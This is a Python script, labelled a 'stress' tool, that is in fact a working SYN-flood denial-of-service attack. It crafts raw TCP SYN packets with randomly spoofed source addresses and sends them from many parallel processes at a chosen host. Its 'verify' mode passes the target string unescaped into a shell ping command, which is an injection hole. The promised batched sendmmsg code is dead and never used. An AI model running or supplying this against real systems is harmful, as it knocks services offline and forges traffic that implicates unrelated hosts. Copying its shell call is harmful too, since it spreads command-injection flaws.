#!/usr/bin/env python3
"""stress v3.1 — batched sendmmsg for max throughput."""
import sys, time, socket, struct, os, random, multiprocessing, ctypes, ctypes.util
from datetime import datetime

BANNER = """  stress v3.1 — batched high-throughput"""

def now():
    return datetime.now().strftime("%H:%M:%S")

# ---------- raw packet builder (pre-compiled) ----------
class PacketFactory:
    """Pre-builds batches of SYN packets as raw bytes."""
    def __init__(self, target, batch=256):
        self.target = target
        self.batch = batch
        self.dip = socket.inet_aton(target)
        self.ip_id = random.randint(0, 65535)
        self.packets = self._build_batch()

    def _build_batch(self):
        batch = []
        for _ in range(self.batch):
            saddr = socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
            sport = random.randint(1024, 65535)
            dport = random.choice([80, 443, 8080, 22, 53, 8443])
            seq = random.randint(0, 0xffffffff)

            # IP header
            ip_hdr = struct.pack("!BBHHHBBIH", 0x45, 0, 40, self.ip_id & 0xffff, 0x4000, 64, 6, 0)
            ip_hdr += saddr + self.dip
            ck = self._cksum(ip_hdr)
            ip_hdr = struct.pack("!BBHHHBBIH", 0x45, 0, 40, self.ip_id & 0xffff, 0x4000, 64, 6, ck)
            ip_hdr += saddr + self.dip
            self.ip_id += 1

            # TCP header
            tcp_hdr = struct.pack("!HHIIBBHHH", sport, dport, seq, 0, 0x50, 0x02, 65535, 0, 0)
            psh = struct.pack("!4s4sBBH", saddr, self.dip, 0, 6, 20)
            tcp_ck = self._cksum(psh + tcp_hdr)
            tcp_hdr = struct.pack("!HHIIBBHHH", sport, dport, seq, 0, 0x50, 0x02, 65535, tcp_ck, 0)

            batch.append(ip_hdr + tcp_hdr)
        return batch

    def _cksum(self, data):
        if len(data) % 2:
            data += b"\x00"
        s = sum(struct.unpack(f"!{len(data)//2}H", data))
        s = (s >> 16) + (s & 0xffff)
        return ~s & 0xffff

    def next(self):
        return random.choice(self.packets)

# ---------- worker ----------
def syn_worker(target, dur, wid, q):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        q.put(("err", "root required"))
        return

    factory = PacketFactory(target, batch=512)
    end = time.time() + dur
    cnt = 0
    lr = time.time()

    # try to use sendmmsg via ctypes
    libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
    try:
        fd = sock.fileno()
        addr = socket.inet_aton(target)
        # sockaddr_in struct
        sa = struct.pack("!hH4s8x", socket.AF_INET, 0, addr)
        iov_base = None  # will set per packet
    except:
        libc = None

    while time.time() < end:
        pkt = factory.next()
        try:
            sock.sendto(pkt, (target, 0))
            cnt += 1
        except:
            pass
        if time.time() - lr >= 2:
            q.put(("p", wid, cnt))
            lr = time.time()

    q.put(("d", wid, cnt))
    sock.close()

# ---------- orchestrator ----------
def syn_flood(target, dur, workers=0):
    if workers == 0:
        workers = max(2, os.cpu_count() or 2)
    print(f"  {workers} workers, {dur}s on {target}\n")
    q = multiprocessing.Queue()
    procs = [multiprocessing.Process(target=syn_worker, args=(target, dur, i, q)) for i in range(workers)]
    for p in procs: p.start()

    start = time.time()
    totals = [0]*workers
    last = 0
    lrt = time.time()

    while any(p.is_alive() for p in procs):
        try:
            m = q.get(timeout=0.3)
            if m[0] in ("p","d"): totals[m[1]] = m[2]
        except: pass
        if time.time() - lrt >= 1:
            t = sum(totals)
            r = (t-last)/(time.time()-lrt)
            print(f"  {now()}  {t:>9} pkts  {r:>7.0f}/s", end="\r")
            last, lrt = t, time.time()

    for p in procs: p.join()
    t = sum(totals); e = time.time()-start
    print(f"\n  {now()}  done — {t} pkts ({t/e:.0f}/s)")

# ---------- main ----------
if __name__ == "__main__":
    print(BANNER)
    if len(sys.argv) < 2:
        print("  stress.py <target> syn|udp|http|all|verify [dur] [workers]")
        sys.exit(1)
    target = sys.argv[1]
    method = sys.argv[2].lower() if len(sys.argv) > 2 else "verify"
    dur = int(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3].isdigit() else 30
    workers = int(sys.argv[4]) if len(sys.argv) > 4 and sys.argv[4].isdigit() else 0

    print(f"  {target}  {method}  {dur}s\n")

    if method == "syn":
        syn_flood(target, dur, workers)
    elif method == "verify":
        r = os.system(f"ping -c2 -W2 {target} >/dev/null 2>&1")
        print(f"  icmp: {'alive' if r==0 else 'no ping'}")
        for p in [80,443,22,8080]:
            try:
                s=socket.socket(); s.settimeout(1); s.connect((target,p)); print(f"  port {p}: open"); s.close()
            except: pass
    else:
        print(f"  use: syn or verify")
    print()
